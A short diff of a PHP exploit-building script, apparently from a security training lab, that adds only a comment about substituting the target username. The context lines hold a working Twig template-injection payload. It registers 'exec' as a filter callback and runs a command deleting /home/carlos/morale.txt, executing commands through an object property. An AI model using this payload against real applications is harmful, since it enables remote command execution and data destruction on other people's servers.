@@ -40,7 +40,7 @@ class Blog {}
 $object = new CustomTemplate;
 $blog = new Blog;
 $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
-$blog->user = 'carlos';
+$blog->user = 'carlos'; //Substitute with the User, in this case it is carlos
 $object->template_file_path = $blog;
 
 
